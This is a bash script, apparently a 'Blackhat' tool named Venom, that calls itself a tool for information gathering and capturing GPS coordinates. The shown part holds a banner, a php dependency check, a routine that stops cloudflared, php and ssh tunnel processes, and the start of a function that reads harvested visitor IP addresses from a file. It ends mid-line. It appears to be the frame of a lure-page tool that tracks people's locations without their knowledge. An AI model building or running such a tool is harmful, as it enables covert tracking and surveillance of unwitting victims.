#!/bin/bash
# Venom v 0.2
# Powered by The Blackhat Venom

trap 'printf "\n";stop' 2

banner() {
clear
printf '
                          ::+                                                              
                      .--:%%.                                                             
                   .--: =@*                                                               
                .--:.  #@-                                                                
                -::::-%%.                      .::%=                                      
        ..      :-=+*@#                        =:.%=                                      
.*+++++#*@@-    **@@@#:::::-------- .-=-:      :*-#=      .:::.      .----=        -:::--:
 .*+-=**#@#    -#@@@#*=*%%%%%%#=-:@=+-:.:%.    :%+#=   :==#%%#*+=-   == :-@*      .@: :.*.
   -**:-*@%   :##@@@.%-+%@#---==++#.+:%@-.%:   :##*=  +-*@#=:-#@*-#- == #%*@=     #%.#*:# 
     %*.*%@: .#*@@@- %=**@=         **#@@=.%:  :###= *-@@-     *@# %-=#%#%@+@:   +@-%@=#% 
     =@+*%@* #+@@@#  %%*-**==+*#%%* *@@@%@=-@- :#@%===%@*      :@@##%=@@@%@%+%  -@+#@@@@@ 
      %*@@@@#+@@@@.  %%%##%%%%%@@#. +%%@:*@+#@=:#@%+##@#=      :@@@%@-%@@@@@@##:@**@@@@@@ 
      :#@@@@*%@@@+   @@@@@@=::...   +*%@: %@@%@+#@%+*@@#+      =@@@@%-@@@%@#%@%@%@@%@@@@@ 
       **@@#%@@@%    @@@%@@         +*%@:  %@@@@#@@+.@@%%.     %%@@@-:@@@@@.%@%*+@@-@@@@@ 
       .%@@*@@@@-   .%@@@@@:-==+**#:+@@@:   #@@@@@@= +@@#%:  .#+*@@* .@@@@@:.@@#@@-:@%@@@ 
        #@@@@@@#    :%@@#*#%%%%@@@@.#@@@-    =%@@@%-  +@@***++*@@@=   @@@@@= -@@@= -@@@@@ 
        -@@@@@@:    *@@@@@@@@%%%@%--%@#=       -#@@:   .+%@@@@%*-     +++*+:  .-.  =@@@@@ 
         @@@@@#                    .-            .:                               .%@@@@@ 
         #@@@+                                                                     -+#@@@.
         :#+.                                                                           : 
\n'
printf "\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n"                                                                                
printf " \e[1;93m      Venom Ver 0.2 - by The Blackhat Venom\e[0m \n"
printf "\e[1;90m Venom is a simple and light tool for information gathering and capturing GPS coordinates.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1
